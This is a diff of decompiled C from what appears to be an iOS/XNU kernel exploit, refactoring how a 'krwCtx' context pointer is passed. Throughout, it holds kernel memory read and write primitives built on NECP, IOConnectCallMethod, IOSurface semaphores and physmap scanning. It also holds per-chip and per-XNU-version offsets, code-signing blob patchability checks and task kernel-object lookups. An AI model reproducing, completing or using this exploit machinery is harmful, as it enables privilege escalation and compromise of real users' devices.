@@ -26263,6 +26263,7 @@ LABEL_67:
 //----- (0000000000026204) ----------------------------------------------------
 __int64 __fastcall necp_semaphore_kread(__int64 a1, __int64 a2, char *a3, mach_msg_type_number_t a4)
 {
+  struct_krwCtx *ctx; // x19
   unsigned __int64 v7; // x8
   __int64 v8; // x21
   __int64 *v9; // x8
@@ -26302,6 +26303,7 @@ __int64 __fastcall necp_semaphore_kread(__int64 a1, __int64 a2, char *a3, mach_m
   mach_vm_size_t kcd_size; // [xsp+238h] [xbp-68h] BYREF
   mach_msg_type_number_t old_stateCnt[2]; // [xsp+240h] [xbp-60h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v7 = *(uint64_t *)(a1 + 344);
   if ( v7 < XNU_VERSION_PACKED(10002, 0, 0, 0, 0) )
   {
@@ -26414,7 +26416,7 @@ __int64 __fastcall necp_semaphore_kread(__int64 a1, __int64 a2, char *a3, mach_m
       {
         v35 = *(uint64_t *)(a1 + 560);
         v36 = 163855;
-        if ( kreadbuf_universal((struct_krwCtx *)a1, v35, 4u, (char *)&v43 + 4, 0) )
+        if ( kreadbuf_universal(ctx, v35, 4u, (char *)&v43 + 4, 0) )
         {
           LODWORD(v43) = HIDWORD(v43) | 0x20;
           v37 = 163856;
@@ -26627,6 +26629,7 @@ __int64 __fastcall pipe_krw_roundtrip_verify(__int64 a1)
 //----- (00000000000268F8) ----------------------------------------------------
 __int64 __fastcall necp_ioconnect_krw(__int64 a1, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
 {
+  struct_krwCtx *ctx; // x19
   __int64 test; // x24
   unsigned int v11; // w27
   unsigned __int64 v12; // x8
@@ -26641,12 +26644,13 @@ __int64 __fastcall necp_ioconnect_krw(__int64 a1, unsigned __int64 a2, __int64 a
   unsigned int v22; // [xsp+8h] [xbp-58h] BYREF
   int v23; // [xsp+Ch] [xbp-54h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   test = 708609;
   if ( *(uint32_t *)(a1 + 6448) == -1
     || *(uint32_t *)(a1 + 6452) == -1
     || *(uint32_t *)(a1 + 6464) == -1
     || !*(uint64_t *)(a1 + 536)
-    || !check_kaddr_in_physmap((struct_krwCtx *)a1, a2) )
+    || !check_kaddr_in_physmap(ctx, a2) )
   {
     return test;
   }
@@ -26689,7 +26693,7 @@ LABEL_27:
     else
       v15 = 4LL - v14;
     v16 = v13 - v14;
-    if ( (v15 <= 3 && (v17 = kreadbuf_via_dev_null_only(a1, v13 - v14, (__int64)&v22, 4u, 0), (uint32_t)v17))
+    if ( (v15 <= 3 && (v17 = kreadbuf_via_dev_null_only(ctx, v13 - v14, (__int64)&v22, 4u, 0), (uint32_t)v17))
       || (v17 = necp_fd_verify_roundtrip(a1, v16), (uint32_t)v17) )
     {
       test = v17;
@@ -26814,7 +26818,7 @@ __int64 __fastcall setup_iosurface_semaphore_helper(__int64 a1)
           break;
         if ( (i & 1) != 0 )
           return (v9 & 0xFFF) | 0x70000000u;
-        if ( !(unsigned int)check_csblob_patchable((struct_krwCtx *)a1, mach_task_self_) )
+        if ( !(unsigned int)check_csblob_patchable(KRWCTX_FROM_UINTPTR(a1), mach_task_self_) )
           return 163905;
       }
       if ( !v9 )
@@ -26877,6 +26881,7 @@ __int64 __fastcall kreadbuf_via_IOConnectCallMethod(
         unsigned int a4,
         int a5)
 {
+  struct_krwCtx *ctx; // x19
   __int64 v5; // x24
   unsigned int v12; // w8
   __int64 v13; // x28
@@ -26912,6 +26917,7 @@ __int64 __fastcall kreadbuf_via_IOConnectCallMethod(
   uint64_t output[2]; // [xsp+38h] [xbp-78h] BYREF
   uint64_t input[2]; // [xsp+48h] [xbp-68h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v5 = 708609;
   if ( (unsigned int)(*(uint32_t *)(a1 + 232) + 1) >= 2 )
   {
@@ -26919,7 +26925,7 @@ __int64 __fastcall kreadbuf_via_IOConnectCallMethod(
     {
       if ( *(uint64_t *)(a1 + 256) )
       {
-        if ( check_kaddr_in_physmap((struct_krwCtx *)a1, a2) )
+        if ( check_kaddr_in_physmap(ctx, a2) )
         {
           v39 = -1;
           if ( !a5 || (v5 = fd_open_dev_null(&v39), !(uint32_t)v5) )
@@ -27075,7 +27081,7 @@ LABEL_29:
                 if ( (int)v15 + (int)v13 >= a4 )
                   goto LABEL_61;
               }
-              if ( krw_ctx_has_read_caps((struct_krwCtx *)a1) )
+              if ( krw_ctx_has_read_caps(ctx) )
               {
                 v16 = *(uint64_t *)(a1 + 344);
                 if ( v16 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
@@ -27111,6 +27117,7 @@ LABEL_62:
 //----- (00000000000271B0) ----------------------------------------------------
 __int64 __fastcall ioconnect_callmethod_write(__int64 a1, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
 {
+  struct_krwCtx *ctx; // x19
   __int64 v5; // x19
   __int64 v12; // x0
   unsigned int v13; // w27
@@ -27134,11 +27141,12 @@ __int64 __fastcall ioconnect_callmethod_write(__int64 a1, unsigned __int64 a2, _
   int v31; // [xsp+1Ch] [xbp-74h] BYREF
   uint64_t input[3]; // [xsp+20h] [xbp-70h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v5 = 708609;
   if ( (unsigned int)(*(uint32_t *)(a1 + 232) + 1) >= 2
     && *(uint64_t *)(a1 + 248)
     && *(uint64_t *)(a1 + 256)
-    && check_kaddr_in_physmap((struct_krwCtx *)a1, a2) )
+    && check_kaddr_in_physmap(ctx, a2) )
   {
     v31 = -1;
     if ( !a5 || (v12 = fd_open_dev_null(&v31), !(uint32_t)v12) )
@@ -27281,6 +27289,7 @@ __int64 __fastcall setup_physmap_krw(__int64 a1, char a2)
   SearchObj scanRange; // [xsp+10h] [xbp-80h] BYREF
   uint64_t physmapEndKaddr; // [xsp+8h] [xbp-88h] BYREF
   uint64_t percpuGlobalValue;
+  struct_krwCtx *ctx = KRWCTX_FROM_UINTPTR(a1);
 
   if ( !*(uint64_t *)(a1 + 128) || !*(uint32_t *)(a1 + 136) )
   {
@@ -27318,12 +27327,12 @@ __int64 __fastcall setup_physmap_krw(__int64 a1, char a2)
     if ( !secondGlobalRef )
       return ERR_NOT_FOUND;
 
-    if ( !kread_physmap_decorated((struct_krwCtx *)a1, firstGlobalRef, &scanRange.field_0x00) )
+    if ( !kread_physmap_decorated(ctx, firstGlobalRef, &scanRange.field_0x00) )
       return ERR_KREAD;
     uint64_t physmapBaseKaddr = scanRange.field_0x00;
     if ( !validate_kaddr_range(a1, physmapBaseKaddr) )
       return ERR_INVALID_KADDR;
-    if ( !kread_physmap_decorated((struct_krwCtx *)a1, secondGlobalRef, &physmapEndKaddr) )
+    if ( !kread_physmap_decorated(ctx, secondGlobalRef, &physmapEndKaddr) )
       return ERR_KREAD;
     if ( !validate_kaddr_range(a1, physmapEndKaddr) )
       return ERR_INVALID_KADDR;
@@ -27360,7 +27369,7 @@ __int64 __fastcall setup_physmap_krw(__int64 a1, char a2)
   if ( !percpuGlobalRef )
     return ERR_BAD_BRANCH;
 
-  if ( !kread64_internal(a1, percpuGlobalRef, &percpuGlobalValue) )
+  if ( !kread64_internal(ctx, percpuGlobalRef, &percpuGlobalValue) )
     return ERR_KREAD;
 
   uint64_t percpuKaddr = percpuGlobalValue + percpuBase;
@@ -27389,6 +27398,7 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
     ERR_UNSUPPORTED_XNU = 163884,
     ERR_TIMEOUT = 2147483697,
   };
+  struct_krwCtx *ctx; // x19
   vm_size_t v4; // x19
   __int64 v6; // x21
   unsigned int v10; // w27
@@ -27465,6 +27475,7 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
   pthread_t v83; // [xsp+20h] [xbp-60h] BYREF
   semaphore_t semaphore; // [xsp+2Ch] [xbp-54h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   address = 0;
   v4 = vm_page_size;
   uint32_t xnuMajor = *(uint32_t *)(a1 + 320);
@@ -27481,16 +27492,16 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
     default:
       return v6;
   }
-  if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A17) )
+  if ( krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A17) )
   {
     v10 = 264;
   }
   else
   {
     v10 = 184;
-    if ( !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
+    if ( !krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
     {
-      if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A11) )
+      if ( krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A11) )
         v10 = 184;
       else
         v10 = 256;
@@ -27527,7 +27538,7 @@ __int64 __fastcall krw_read_validation(__int64 a1, char a2)
         else
         {
           v23 = v22;
-          v24 = get_task_kobject_addr((struct_krwCtx *)a1, v22);
+          v24 = get_task_kobject_addr(ctx, v22);
           if ( v24 )
           {
             v25 = kaddr_to_phys_v1(a1, v24 + v10);
@@ -27573,7 +27584,7 @@ LABEL_158:
       v21 = 9728;
       goto LABEL_66;
     case 8792:
-      if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
+      if ( krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
         v21 = 9952;
       else
         v21 = 9936;
@@ -27584,7 +27595,7 @@ LABEL_158:
     case 10002:
       v20 = 40;
       v13 = *(uint64_t *)(a1 + 344);
-      v14 = !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
+      v14 = !krw_ctx_has_flag(ctx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
       if ( v13 < XNU_VERSION_PACKED(10002, 42, 8, 0, 0) )
       {
         v15 = 17904;
@@ -28130,13 +28141,13 @@ LABEL_47:
       goto LABEL_19;
     }
     v9 = 163856;
-    if ( !(unsigned int)kwritebuf_universal(a1, v8, &v36, 4) )
+    if ( !(unsigned int)kwritebuf_universal((uint64_t *)KRWCTX_RAW_PTR(a1), v8, &v36, 4) )
       goto LABEL_72;
     v10 = IOServiceMatching("IOGPU");
     MatchingService = IOServiceGetMatchingService(kIOMasterPortDefault, v10);
     if ( MatchingService + 1 < 2 )
     {
-      if ( (unsigned int)kwritebuf_universal(a1, v8, &v37, 4) )
+      if ( (unsigned int)kwritebuf_universal((uint64_t *)KRWCTX_RAW_PTR(a1), v8, &v37, 4) )
         v3 = 708625;
       else
         v3 = 163856;
@@ -28155,7 +28166,7 @@ LABEL_47:
     {
       v3 = 0;
     }
-    v26 = kwritebuf_universal(a1, v8, &v37, 4);
+    v26 = kwritebuf_universal((uint64_t *)KRWCTX_RAW_PTR(a1), v8, &v37, 4);
     IOObjectRelease(v12);
     if ( !v26 )
       goto LABEL_72;
